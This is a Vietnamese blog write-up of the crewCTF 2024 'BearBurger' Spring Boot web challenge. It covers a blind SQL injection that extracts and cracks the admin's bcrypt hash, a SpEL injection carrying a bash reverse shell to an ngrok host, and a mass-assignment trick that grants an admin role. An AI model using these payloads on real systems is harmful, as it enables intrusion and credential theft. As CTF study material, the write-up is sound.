@@ -1,0 +1,171 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Preface Challenge này mình ngồi làm từ đầu giải đến cuối giải nhưng đã không kịp solve, vì cay cú nên mình sẽ viết write up để lưu lại kiến thức mình học được thông qua challenge này. Bearburger là challenge mà tác giả custom lại code project Bear Burger Spring Boot tại github. Các chức năng như make admin, remove admin đã bị xóa bỏ, mình có thể nói là 1 phiên bản tối giản và &ldquo;có thể khai thác hơn&rdquo; từ version trên github\n"><title>crewCTF2024 - BearBurger</title><link rel=canonical href=https://kev1n1203.github.io/p/crewctf-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="crewCTF2024 - BearBurger"><meta property='og:description' content="Preface Challenge này mình ngồi làm từ đầu giải đến cuối giải nhưng đã không kịp solve, vì cay cú nên mình sẽ viết write up để lưu lại kiến thức mình học được thông qua challenge này. Bearburger là challenge mà tác giả custom lại code project Bear Burger Spring Boot tại github. Các chức năng như make admin, remove admin đã bị xóa bỏ, mình có thể nói là 1 phiên bản tối giản và &ldquo;có thể khai thác hơn&rdquo; từ version trên github\n"><meta property='og:url' content='https://kev1n1203.github.io/p/crewctf-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-08-05T09:47:56+00:00'><meta property='article:modified_time' content='2024-08-05T09:47:56+00:00'><meta name=twitter:title content="crewCTF2024 - BearBurger"><meta name=twitter:description content="Preface Challenge này mình ngồi làm từ đầu giải đến cuối giải nhưng đã không kịp solve, vì cay cú nên mình sẽ viết write up để lưu lại kiến thức mình học được thông qua challenge này. Bearburger là challenge mà tác giả custom lại code project Bear Burger Spring Boot tại github. Các chức năng như make admin, remove admin đã bị xóa bỏ, mình có thể nói là 1 phiên bản tối giản và &ldquo;có thể khai thác hơn&rdquo; từ version trên github\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#preface>Preface</a></li><li><a href=#source-code-analysis>Source code analysis</a><ol><li><a href=#sql-injection-in-order-by-clause>SQL Injection in Order By Clause</a></li><li><a href=#spel-injection-in-fetchalluser>SpEL Injection in fetchAllUser</a></li><li><a href=#another-workaround-to-admin>Another Workaround to Admin</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/crewctf-2024/>crewCTF2024 - BearBurger</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-08-05T09:47:56Z>Aug 05, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h2 id=preface>Preface</h2><p>Challenge này mình ngồi làm từ đầu giải đến cuối giải nhưng đã không kịp solve, vì cay cú nên mình sẽ viết write up để lưu lại kiến thức mình học được thông qua challenge này.
+Bearburger là challenge mà tác giả custom lại code project Bear Burger Spring Boot tại <a class=link href=https://github.com/Raofin/BearBurger/ target=_blank rel=noopener>github</a>. Các chức năng như make admin, remove admin đã bị xóa bỏ, mình có thể nói là 1 phiên bản tối giản và &ldquo;có thể khai thác hơn&rdquo; từ version trên github</p><h2 id=source-code-analysis>Source code analysis</h2><p>Author tuy đưa cả file war nhưng lại không cho file database, nên mình phải đi tìm file sql của src github để nhét vào, và lưu ý khi lấy từ trên đó về mình sẽ cần phải khai báo username là kiểu varchar(300) cho hợp lý với khai báo thuộc tính đó trong model User:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Column</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Username&#34;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=nd>@NotNull</span><span class=w> </span><span class=nd>@Size</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>min</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>4</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>max</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>300</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=sql-injection-in-order-by-clause>SQL Injection in Order By Clause</h3><p>Thoạt đầu mình nhìn thì cũng spot được ngay chỗ khai thác SQL Injection tại endpoint: <code>/api/v1/fetch-foods-by-category/{category}/{sorting}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@RequestMapping({&#34;/api/v1&#34;})
+</span></span><span class=line><span class=cl>public class FoodController {
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>    @GetMapping({&#34;/fetch-foods-by-category/{category}/{sorting}&#34;})
+</span></span><span class=line><span class=cl>    List&lt;Food&gt; fetchFoodsByCategory(@PathVariable String category, @PathVariable String sorting) {
+</span></span><span class=line><span class=cl>        return this.foodService.findByCategory(category, sorting);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>API này gọi đến method <code>findByCategory</code> nằm tại <code>/service/FoodServiceImpl.class</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public List&lt;Food&gt; findByCategory(String category, String sorting) {
+</span></span><span class=line><span class=cl>    String jpqlQuery = &#34;SELECT f FROM Food f WHERE f.category = :category ORDER BY &#34; + sorting + &#34; DESC&#34;;
+</span></span><span class=line><span class=cl>    return this.entityManager.createQuery(jpqlQuery, Food.class).setParameter(&#34;category&#34;, category).getResultList();
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Cộng chuỗi như thế kia thì sure kèo là dính SQL Injection rồi =))), nhưng việc inject vào HQL với DBMS đằng sau là MySQL mình thấy khá khó khăn, khi việc HQL xử lý giới hạn số bảng, nó chỉ có thể select được giá trị từ những bảng nằm trong các thực thể đã được map và khai báo, nên ta cũng không đụng được đến được infomation_schema hay gì cả, chỉ có thể dump data trong các bảng hiện tại thôi.
+Lúc này mình nghĩ trong đầu là lên được admin bằng cách nào, trong khi password được mã hóa Bcrypt cơ chứ :)), chả nhẽ crack đến chết. Thật bất ngờ intended là crack password thật (mình mất phần lớn thời gian của 2 ngày để tìm cách thực hiện câu lệnh update hay insert nhưng thất bại).
+Thôi không dài dòng, mình tiến hành craft payload extract data boolean based như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>extractvalue(null,concat(&#39;~&#39;,(select password from User u where u.username = &#39;admin&#39;),&#39;~&#39;))
+</span></span></code></pre></td></tr></table></div></div><p>Nếu như request select thành công, sẽ trả về lỗi không thể lấy resultSet vì payload trigger lỗi error based:
+<img src=https://hackmd.io/_uploads/By587p6tA.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/S1jOm6atA.png loading=lazy alt=image><br>Còn nếu như câu query sai, thì server sẽ không trigger error based nên sẽ hiển thị được thông tin bình thường:
+<img src=https://hackmd.io/_uploads/BJrC7p6K0.png loading=lazy alt=image><br>Vậy là payload của mình work, nhưng kết quả thì không được trả ra, nên giờ mình sẽ craft để extract password bằng cách blind thôi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>extractvalue(null,concat(&#39;~&#39;,(select password from User u where u.username = &#39;admin&#39; and binary(substr(u.password,1,1)) = &#39;$&#39;),&#39;~&#39;))
+</span></span></code></pre></td></tr></table></div></div><p>Vì mình biết mật khẩu được hash theo kiểu Bcrypt nên đoạn ký tự đầu lúc nào cũng kiểu <code>$2a$10</code>, thử kí tự đầu là $ thì payload đã trả về lỗi (đúng như dự đoán):
+<img src=https://hackmd.io/_uploads/rJ7jV6ptR.png loading=lazy alt=image><br>Tốt rồi, đưa vào intruder thôi, Bcrypt hash ra độ dài cố định là 60.
+<img src=https://hackmd.io/_uploads/Bkk18pTtA.png loading=lazy alt=image><br>Mình có được kết quả hash admin local là: <code>$2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvynF9E7Q6e21sMi7tBRPqL8zvS</code>, hashcat mình có được pass local là admin =)), yếu thật
+Vác payload sang challenge thật, mình có hash dump được là: <code>$2a$10$vFWElvoCouv8LuyTzOCT8eMq4KSvvbxEPpwRdXcJvDkSmVUbmooTW</code>
+Nhét hash vào file hash-2, chạy hashcat attack mode 3200 theo <a class=link href="https://hashcat.net/wiki/doku.php?id=example_hashes" target=_blank rel=noopener>https://hashcat.net/wiki/doku.php?id=example_hashes</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hashcat -m 3200 -a 0 hash-2 /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/HylE366FR.png loading=lazy alt=image><br>Mình có mật khẩu admin tại web challenge là <code>adidas</code>, quá yếu =)))</p><h3 id=spel-injection-in-fetchalluser>SpEL Injection in fetchAllUser</h3><p>Leo lên được admin, mình diff code với project có trên github thì thấy đoạn code fetchAllUser dính lỗi parseExpression tên của user, chức năng này nằm tại api /api/v1/admin vốn chỉ được truy cập khi người dùng có role ADMIN:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>@</span><span class=n>RequestMapping</span><span class=p>({</span><span class=s2>&#34;/api/v1/admin&#34;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>public</span> <span class=k>class</span> <span class=n>UserController</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=o>...</span>
+</span></span><span class=line><span class=cl>    <span class=err>@</span><span class=n>GetMapping</span><span class=p>({</span><span class=s2>&#34;/fetch-all-users&#34;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>List</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span> <span class=n>fetchUsersByUsers</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>this</span><span class=o>.</span><span class=n>userService</span><span class=o>.</span><span class=n>fetchAllUsers</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>Transactional</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>readOnly</span> <span class=o>=</span> <span class=bp>true</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>public</span> <span class=n>List</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span> <span class=n>fetchAllUsers</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>List</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span> <span class=n>result</span> <span class=o>=</span> <span class=n>this</span><span class=o>.</span><span class=n>userRepository</span><span class=o>.</span><span class=n>findAll</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>ExpressionParser</span> <span class=n>userParser</span> <span class=o>=</span> <span class=n>new</span> <span class=n>SpelExpressionParser</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Iterator</span> <span class=n>var3</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>iterator</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=n>var3</span><span class=o>.</span><span class=n>hasNext</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>User</span> <span class=n>user</span> <span class=o>=</span> <span class=p>(</span><span class=n>User</span><span class=p>)</span><span class=n>var3</span><span class=o>.</span><span class=n>next</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>Expression</span> <span class=n>expression</span> <span class=o>=</span> <span class=n>userParser</span><span class=o>.</span><span class=n>parseExpression</span><span class=p>(</span><span class=n>user</span><span class=o>.</span><span class=n>getUsername</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>            <span class=ne>String</span> <span class=n>var6</span> <span class=o>=</span> <span class=p>(</span><span class=ne>String</span><span class=p>)</span><span class=n>expression</span><span class=o>.</span><span class=n>getValue</span><span class=p>(</span><span class=ne>String</span><span class=o>.</span><span class=k>class</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>var7</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Giờ mình đã hiểu lí do tại sao lại kéo username lên 300 kí tự khi ban đầu có 15 kí tự thôi =))
+Giờ mình sẽ register payload reverse shell xem sao, payload reverse shell mình tham khảo từ <a class=link href=https://github.com/welk1n/ReverseShell-Java target=_blank rel=noopener>https://github.com/welk1n/ReverseShell-Java</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>T(java.lang.Runtime).getRuntime().exec(&#39;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/0.tcp.ap.ngrok.io/14482 0&gt;&amp;1&#39;)
+</span></span></code></pre></td></tr></table></div></div><p>Chèn payload vào username, mình bắt intercept cho tiện:
+<img src=https://hackmd.io/_uploads/H1vkkCTtC.png loading=lazy alt=image><br>Gửi request và mình rev shell thành công:
+<img src=https://hackmd.io/_uploads/S15-yA6Y0.png loading=lazy alt=image><br>Sau đó là khoảng thời gian mình đi tìm flag =)), tìm ở các file enciron hay hệ thống không có, mình tìm cả ở db nhưng cũng không có:
+<img src=https://hackmd.io/_uploads/By9o7CTFC.png loading=lazy alt=image><br>Mình ngố quá, không nhận ra là flag nằm ngay tại thư mục chứa file war mà cứ đi tìm =)) (mình không để ý tên file)
+<img src=https://hackmd.io/_uploads/SkxIX0aFA.png loading=lazy alt=image><br><strong>Flag:</strong> crew{BearBurger_is_on_sale!_LINZ_IS_HERE}</p><h3 id=another-workaround-to-admin>Another Workaround to Admin</h3><p>Khi mình đi hỏi những người đã solve được challenge thì nhận được cách khác với cách intended của tác giả, đó là khai thác mass assignment vào register để tạo thêm 1 role nữa cho mình.
+Đoạn code xử lý của chức năng register khá đơn giản, nó chỉ hash mật khẩu trước khi lưu vào bảng user, và lưu 1 hàng mang luôn giá trị CUSTOMER vào bảng roles:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public void registerUser(User user) {
+</span></span><span class=line><span class=cl>    user.setPassword(this.passwordEncoder.encode(user.getPassword()));
+</span></span><span class=line><span class=cl>    this.userRepository.save(user);
+</span></span><span class=line><span class=cl>    this.roleRepository.save(new Role(user.getUserID()));
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>....
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>public Role(int userID) {
+</span></span><span class=line><span class=cl>    this.userID = userID;
+</span></span><span class=line><span class=cl>    this.name = &#34;CUSTOMER&#34;;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Lúc này, mình sẽ có thể truyền vào 1 hàng mới user của mình bằng cách sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>roles[0].roleID.=1&amp;roles[0].userID=1&amp;roles[0].name=ADMIN
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/rJ62OlAKC.png loading=lazy alt=image><br>Trong db ta có người dùng đó với userID 18:
+<img src=https://hackmd.io/_uploads/SJX3OxAFC.png loading=lazy alt=image><br>Tại bảng roles thì ta có 2 hàng để chứa role của user kev1n-3 là CUSTOMER và ADMIN:
+<img src=https://hackmd.io/_uploads/BkUeKlRt0.png loading=lazy alt=image><br>Số của roleID và userID truyền vào không quan trọng, mình có thể truyền gì cũng được nhưng bắt buộc cần truyền giá trị vào, vì 2 biến này sẽ được gen ra tương ứng trong bảng khi khởi tạo user và khởi tạo đối tượng Role bằng userID. Theo như mình hiểu là sau khi nó save đối tượng user thì row role ADMIN sẽ được save, sau đó role CUSTOMER được save sau đó tại câu lệnh bên dưới.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
